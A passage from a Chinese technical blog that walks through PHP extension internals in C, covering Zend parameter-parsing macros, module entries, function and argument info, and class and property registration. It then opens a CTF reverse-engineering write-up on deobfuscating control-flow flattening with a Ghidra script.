ZPP_ERROR_FAILURE; \</span><br><span class="line">				<span class="keyword">break</span>; \</span><br><span class="line">			&#125; \</span><br><span class="line">			_real_arg = ZEND_CALL_VAR_NUM(execute_data, <span class="number">-1</span>);</span><br><span class="line"><span class="comment">// Z_PARAM_OPTIONAL</span></span><br><span class="line">      _optional = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// Z_PARAM_STRING</span></span><br><span class="line">      ++_i; \</span><br><span class="line">      ZEND_ASSERT(_i &lt;= _min_num_args || _optional==<span class="number">1</span>); \</span><br><span class="line">      ZEND_ASSERT(_i &gt;  _min_num_args || _optional==<span class="number">0</span>); \</span><br><span class="line">      <span class="keyword">if</span> (_optional) &#123; \</span><br><span class="line">        <span class="keyword">if</span> (UNEXPECTED(_i &gt;_num_args)) <span class="keyword">break</span>; \</span><br><span class="line">      &#125; \</span><br><span class="line">      _real_arg++; \</span><br><span class="line">      _arg = _real_arg; \</span><br><span class="line">      <span class="keyword">if</span> (UNEXPECTED(!zend_parse_arg_string(_arg, &amp;var, &amp;var_len, <span class="number">0</span>, _i))) &#123; \</span><br><span class="line">        _expected_type = <span class="number">0</span> ? Z_EXPECTED_STRING_OR_NULL : Z_EXPECTED_STRING; \</span><br><span class="line">        _error_code = ZPP_ERROR_WRONG_ARG; \</span><br><span class="line">        <span class="keyword">break</span>; \</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">// ZEND_PARSE_PARAMETERS_END</span></span><br><span class="line">      ZEND_ASSERT(_i == _max_num_args || _max_num_args == (<span class="type">uint32_t</span>) <span class="number">-1</span>); \</span><br><span class="line">		&#125; <span class="keyword">while</span> (<span class="number">0</span>); \</span><br><span class="line">		<span class="keyword">if</span> (UNEXPECTED(_error_code != ZPP_ERROR_OK)) &#123; \</span><br><span class="line">			<span class="keyword">if</span> (!(_flags &amp; ZEND_PARSE_PARAMS_QUIET)) &#123; \</span><br><span class="line">				zend_wrong_parameter_error(_error_code, _i, _error, _expected_type, _arg); \</span><br><span class="line">			&#125; \</span><br><span class="line">			<span class="keyword">return</span>; \</span><br><span class="line">		&#125; \</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>由于C语言没有类的概念，因此对于一些需要泛型的操作只有通过宏定义实现才能让代码更加简洁，也提升了代码审计的难度。这段代码有一个比较有趣的地方——大量使用了<code>do ... while(0)</code>的控制流结构，这看上去冗余，但实际上是为了隔离作用域，让宏定义中的临时变量具有临时作用域，使宏定义调用方对于临时变量不可见，避免调用方多次调用相同宏定义时出现变量重复定义的问题。</p>
<p>在上面的代码中，关键逻辑实际上就是一行，即调用<code>zend_parse_arg_string</code>函数进行参数解析。前后添加了一些安全检查，包括参数个数、解析是否成功等。下面简单分析一下<code>zend_parse_arg_string</code>的相关逻辑。</p>
<h3 id="zend_parse_arg_string"><a class="markdownIt-Anchor" href="#zend_parse_arg_string"></a> <code>zend_parse_arg_string</code></h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_API.h, line 1984</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">bool</span> <span class="title function_">zend_parse_arg_str</span><span class="params">(zval *arg, zend_string **dest, <span class="type">bool</span> check_null, <span class="type">uint32_t</span> arg_num)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (EXPECTED(Z_TYPE_P(arg) == IS_STRING)) &#123;</span><br><span class="line">		*dest = Z_STR_P(arg);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (check_null &amp;&amp; Z_TYPE_P(arg) == IS_NULL) &#123;</span><br><span class="line">		*dest = <span class="literal">NULL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> zend_parse_arg_str_slow(arg, dest, arg_num);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">bool</span> <span class="title function_">zend_parse_arg_string</span><span class="params">(zval *arg, <span class="type">char</span> **dest, <span class="type">size_t</span> *dest_len, <span class="type">bool</span> check_null, <span class="type">uint32_t</span> arg_num)</span></span><br><span class="line">&#123;</span><br><span class="line">	zend_string *str;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!zend_parse_arg_str(arg, &amp;str, check_null, arg_num)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (check_null &amp;&amp; UNEXPECTED(!str)) &#123;</span><br><span class="line">		*dest = <span class="literal">NULL</span>;</span><br><span class="line">		*dest_len = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*dest = ZSTR_VAL(str);</span><br><span class="line">		*dest_len = ZSTR_LEN(str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以清晰地看到这里PHP源代码对传入的<code>zval</code>进行解析的过程。由于<code>zval</code>结构中的<code>zend_value</code>是一个联合类型，因此可以用于表示多种数据类型，相互转换也非常简单。</p>
<p>由此可知，<code>ZEND_PARSE_PARAMETERS_START</code>与<code>ZEND_PARSE_PARAMETERS_END</code>之间即为C库函数解析PHP参数的流程，在<code>ZEND_PARSE_PARAMETERS_START</code>中，需要指定要解析第几个参数，随后在内部可通过多次使用<code>Z_PARAM_xxx</code>进行参数解析。</p>
<h3 id="zend_module_entry"><a class="markdownIt-Anchor" href="#zend_module_entry"></a> <code>zend_module_entry</code></h3>
<p>这是一个在预先定义的C库文件中被使用的数据结构。从最上面的代码注释可以看到，这个数据类型定义了PHP模块的基本信息，包括扩展的名字、库函数的入口（定义的所有导出函数）、初始化函数、关闭函数、请求初始化函数、请求关闭函数、phpinfo钩子函数、版本等。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINFO_FUNCTION(hello_phpext)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;hello_phpext support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">zend_module_entry hello_phpext_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;hello_phpext&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	ext_functions,					<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(hello_phpext),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(hello_phpext),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLO_PHPEXT_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中，<code>PHP_MINFO</code>用于定义挂钩在phpinfo函数中的C库函数。它的作用是当PHP代码调用<code>phpinfo()</code>函数时显示PHP基本信息时，能够在其上附加显示本扩展的基本信息，包括扩展名、作者等。</p>
<ul>
<li><code>php_info_print_table_start</code>：开始显示phpinfo表格。</li>
<li><code>php_info_print_table_header</code>：输出表格头，第一个参数为需要添加的列数，后面的参数个数需要等于第一个参数的值，表示不同列的输出内容。</li>
<li><code>php_info_print_table_row</code>：输出表格内容，第一个参数为该行的列数，后面参数个数等于第一个参数的值，表示不同列的输出内容。</li>
<li><code>php_info_print_table_end</code>：结束输出phpinfo表格。</li>
</ul>
<p>对于下面的<code>PHP_MINFO_FUNCTION</code>定义，调用<code>phpinfo</code>后可看到下图表格的输出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINFO_FUNCTION(hello_phpext)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;hello_phpext support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_row(<span class="number">2</span>, <span class="string">&quot;author&quot;</span>, <span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="1.png" alt="" /></p>
<h3 id="zend_function_entry等"><a class="markdownIt-Anchor" href="#zend_function_entry等"></a> <code>zend_function_entry</code>等</h3>
<p>这是用于表示C库的导出PHP函数的结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_API.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_function_entry</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *fname;</span><br><span class="line">	zif_handler handler;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_arg_info</span> *<span class="title">arg_info</span>;</span></span><br><span class="line">	<span class="type">uint32_t</span> num_args;</span><br><span class="line">	<span class="type">uint32_t</span> flags;</span><br><span class="line">&#125; zend_function_entry;</span><br></pre></td></tr></table></figure>
<p>在<code>hello_phpext_arginfo.h</code>中，有一个<code>static const zend_function_entry ext_functions[]</code>的数组结构，其中即保存了本扩展中导出的，可在PHP代码中直接调用的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> zend_function_entry ext_functions[] = &#123;</span><br><span class="line">	ZEND_FE(test1, arginfo_test1)</span><br><span class="line">	ZEND_FE(test2, arginfo_test2)</span><br><span class="line">	ZEND_FE_END</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中的每一个导出函数都使用<code>ZEND_FE</code>宏定义包裹，第一个参数为函数名，第二个参数为函数的参数信息。</p>
<p>头文件中也对参数类型进行了定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(arginfo_test1, <span class="number">0</span>, <span class="number">0</span>, IS_VOID, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(arginfo_test2, <span class="number">0</span>, <span class="number">0</span>, IS_STRING, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_TYPE_INFO_WITH_DEFAULT_VALUE(<span class="number">0</span>, str, IS_STRING, <span class="number">0</span>, <span class="string">&quot;\&quot;\&quot;&quot;</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br></pre></td></tr></table></figure>
<p>下面给出这些宏的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_API.h, line 183</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(name, return_reference, required_num_args, type, allow_null) \</span></span><br><span class="line"><span class="meta">	ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX2(name, return_reference, required_num_args, type, allow_null, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /Zend/zend_API.h, line 179</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX2(name, return_reference, required_num_args, type, allow_null, is_tentative_return_type) \</span></span><br><span class="line"><span class="meta">	static const zend_internal_arg_info name[] = &#123; \</span></span><br><span class="line"><span class="meta">		&#123; (const char*)(zend_uintptr_t)(required_num_args), ZEND_TYPE_INIT_CODE(type, allow_null, _ZEND_ARG_INFO_FLAGS(return_reference, 0, is_tentative_return_type)), NULL &#125;,</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Zend/zend_API.h, line 197</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_END_ARG_INFO()		&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Zend/zend_compile.h, line 400</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* arg_info for internal functions */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_arg_info</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	zend_type type;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *default_value;</span><br><span class="line">&#125; zend_internal_arg_info;</span><br></pre></td></tr></table></figure>
<p>因此，<code>ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(arginfo_test1, 0, 0, IS_VOID, 0)</code>展开就是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> zend_internal_arg_info arginfo_test1[] = &#123; \</span><br><span class="line">		&#123; (<span class="type">const</span> <span class="type">char</span>*)(<span class="type">zend_uintptr_t</span>)(<span class="number">0</span>), ZEND_TYPE_INIT_CODE(IS_VOID, <span class="number">0</span>, _ZEND_ARG_INFO_FLAGS(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)), <span class="literal">NULL</span> &#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中括号未闭合，用于在下面继续定义其他参数。这个宏定义实际上是首先定义了返回值的类型，它的5个参数分别代表：</p>
<ul>
<li>1 - 函数名</li>
<li>2 - 返回值是否为引用值</li>
<li>3 - 必需的参数数量</li>
<li>4 - 返回值类型</li>
<li>5 - 返回值是否允许为空</li>
</ul>
<p>这里需要注意的是，参数3表示必需的参数数量，在PHP函数中还可以添加一些可选参数。即即使传入的必需参数数量为0，在<code>ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX</code>之后依然可以定义任意多的可选参数。即使PHP代码中没有传入这些可选参数，在库函数中只是会被当成默认值看待，而不会直接报错。</p>
<p>其中，对于<code>ZEND_TYPE_INIT_CODE</code>的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TYPE_INIT_CODE(code, allow_null, extra_flags) \</span></span><br><span class="line"><span class="meta">	ZEND_TYPE_INIT_MASK(((code) == _IS_BOOL ? MAY_BE_BOOL : ((code) == IS_MIXED ? MAY_BE_ANY : (1 &lt;&lt; (code)))) \</span></span><br><span class="line"><span class="meta">		| ((allow_null) ? _ZEND_TYPE_NULLABLE_BIT : 0) | (extra_flags))</span></span><br></pre></td></tr></table></figure>
<p>它的3个参数分别代表数据类型、是否允许空、其他参数标志位。</p>
<p>在<code>ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX</code>之后，可以定义所有参数。定义使用下面的宏定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_ARG_TYPE_INFO(pass_by_ref, name, type_hint, allow_null) \</span></span><br><span class="line"><span class="meta">	&#123; #name, ZEND_TYPE_INIT_CODE(type_hint, allow_null, _ZEND_ARG_INFO_FLAGS(pass_by_ref, 0, 0)), NULL &#125;,</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_ARG_TYPE_INFO_WITH_DEFAULT_VALUE(pass_by_ref, name, type_hint, allow_null, default_value) \</span></span><br><span class="line"><span class="meta">	&#123; #name, ZEND_TYPE_INIT_CODE(type_hint, allow_null, _ZEND_ARG_INFO_FLAGS(pass_by_ref, 0, 0)), default_value &#125;,</span></span><br></pre></td></tr></table></figure>
<p><code>type_hint</code>即为参数的数据类型，<code>pass_by_ref</code>表示是否传入引用。</p>
<h3 id="php类相关"><a class="markdownIt-Anchor" href="#php类相关"></a> PHP类相关</h3>
<p>在C语言的PHP扩展中，可以完成对PHP类的定义，包括类属性、类方法的定义等。这里以PHP源码为例。</p>
<p>在<code>/ext/com_dotnet/com_persist_arginfo.h</code>中，C代码定义了一个<code>COMPersistHelper</code>类。要想让这个类在PHP代码中能够直接使用，需要一个类注册函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ext/com_dotnet/com_persist_arginfo.h, line 56</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_class_entry *<span class="title function_">register_class_COMPersistHelper</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	zend_class_entry ce, *class_entry;</span><br><span class="line"></span><br><span class="line">	INIT_CLASS_ENTRY(ce, <span class="string">&quot;COMPersistHelper&quot;</span>, class_COMPersistHelper_methods);</span><br><span class="line">	class_entry = zend_register_internal_class_ex(&amp;ce, <span class="literal">NULL</span>);</span><br><span class="line">	class_entry-&gt;ce_flags |= ZEND_ACC_FINAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> class_entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>类注册代码具有固定的函数声明格式，其必为静态函数，返回值必为<code>zend_class_entry*</code>，函数名应被命名为<code>register_class_xxx</code>，无参。</p>
<p>在函数中，必需进行类的初始化，即调用<code>INIT_CLASS_ENTRY</code>宏，这个宏的第一个参数固定，第二个参数为类名，第三个参数为定义类中方法的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ext/com_dotnet/com_persist_arginfo.h, line 44</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> zend_function_entry class_COMPersistHelper_methods[] = &#123;</span><br><span class="line">	ZEND_ME(COMPersistHelper, __construct, arginfo_class_COMPersistHelper___construct, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, GetCurFileName, arginfo_class_COMPersistHelper_GetCurFileName, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, SaveToFile, arginfo_class_COMPersistHelper_SaveToFile, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, LoadFromFile, arginfo_class_COMPersistHelper_LoadFromFile, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, GetMaxStreamSize, arginfo_class_COMPersistHelper_GetMaxStreamSize, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, InitNew, arginfo_class_COMPersistHelper_InitNew, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, LoadFromStream, arginfo_class_COMPersistHelper_LoadFromStream, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, SaveToStream, arginfo_class_COMPersistHelper_SaveToStream, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_FE_END</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>若需要定义类中的方法，只需要完成对这个数组的定义即可，数组应命名为<code>class_xxx_methods</code>，数组中需要使用<code>ZEND_ME</code>宏表示类方法项。这个宏各个参数的含义如下：</p>
<ul>
<li>1 - 类名，不加引号。</li>
<li>2 - 方法名，前加<code>__</code>的是内置函数，如构造函数、setter、getter等。</li>
<li>3 - 方法的参数定义，与函数参数定义方式相同。</li>
<li>4 - 类访问权限，如<code>ZEND_ACC_PUBLIC</code>指<code>public</code>访问权限等。</li>
</ul>
<p>如果需要定义类属性，则需在类注册函数中完成定义。下面是PHP类<code>DOMDocumentType</code>类的注册函数的一部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ext/dom/php_dom_arginfo.h, line 905</span></span><br><span class="line"></span><br><span class="line">	zval property_name_default_value;</span><br><span class="line">	ZVAL_UNDEF(&amp;property_name_default_value);</span><br><span class="line">	zend_string *property_name_name = zend_string_init(<span class="string">&quot;name&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;name&quot;</span>) - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	zend_declare_typed_property(class_entry, property_name_name, &amp;property_name_default_value, ZEND_ACC_PUBLIC, <span class="literal">NULL</span>, (zend_type) ZEND_TYPE_INIT_MASK(MAY_BE_STRING));</span><br><span class="line">	zend_string_release(property_name_name);</span><br></pre></td></tr></table></figure>
<p>在上面的代码中，为类<code>DOMDocumentType</code>定义了一个属性，名为<code>name</code>，这里是使用<code>zend_string_init</code>定义字符串，前两个参数分别为<code>char*</code>和长度，第3个长度指是否为永久字符串。随后，通过<code>zend_declare_typed_property</code>正式将属性添加到类中，参数列表如下：</p>
<ul>
<li>1 - 注册函数的参数</li>
<li>2 - 属性名</li>
<li>3 - 默认值</li>
<li>4 - 访问权限</li>
<li>5 - 文档字符串</li>
<li>6 - 属性类型</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ext/dom/php_dom_arginfo.h, line 911</span></span><br><span class="line"></span><br><span class="line">	zend_string *property_entities_class_DOMNamedNodeMap = zend_string_init(<span class="string">&quot;DOMNamedNodeMap&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;DOMNamedNodeMap&quot;</span>)<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">	zval property_entities_default_value;</span><br><span class="line">	ZVAL_UNDEF(&amp;property_entities_default_value);</span><br><span class="line">	zend_string *property_entities_name = zend_string_init(<span class="string">&quot;entities&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;entities&quot;</span>) - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	zend_declare_typed_property(class_entry, property_entities_name, &amp;property_entities_default_value, ZEND_ACC_PUBLIC, <span class="literal">NULL</span>, (zend_type) ZEND_TYPE_INIT_CLASS(property_entities_class_DOMNamedNodeMap, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	zend_string_release(property_entities_name);</span><br></pre></td></tr></table></figure>
<p>上面的代码定义了数据类型为类的类属性，这里是定义一个<code>DOMNamedNodeMap</code>类型的类属性，需要使用<code>ZEND_TYPE_INIT_CLASS</code>宏定义。最后的<code>zend_string_release</code>即释放字符串值。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/04/03/buuctf-reverse-write-ups-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/03/buuctf-reverse-write-ups-2/" class="post-title-link" itemprop="url">buuctf-reverse write-ups (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-03 00:37:11" itemprop="dateCreated datePublished" datetime="2024-04-03T00:37:11+08:00">2024-04-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-07-19 16:13:15" itemprop="dateModified" datetime="2024-07-19T16:13:15+08:00">2024-07-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>18 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu097-suctf2019hardcpp"><a class="markdownIt-Anchor" href="#buu097-suctf2019hardcpp"></a> buu097-[SUCTF2019]hardcpp</h1>
<p>这是一个简单的C++程序，但带有大量的控制流平坦化混淆。下面我将从头开始编写用于解决此类混淆问题的Ghidra脚本作为学习。</p>
<p>控制流平坦化中使用一个非常重要的值作为分发器。通常是以这个值为基础将控制流进行拆分，最终形成一个大型的switch语句。如一开始设置分发器为0x12345678，执行某些操作后再修改其值为0x87654321，随后重新进入循环并在switch中寻找该项。</p>
<p>使用静态分析方式对控制流平坦化混淆的代码进行解混淆的方式称为静态还原。静态还原的首要任务就是通过静态分析找到分发器是什么。好在控制流平坦化中的分发器一般都较为明显。下面将参考多篇资料完成本Ghidra脚本的编写。考虑使用Ghidra而不是其他静态反汇编工具主要是考虑到Ghidra完全开源，能够较为方便地查找相关的API。</p>
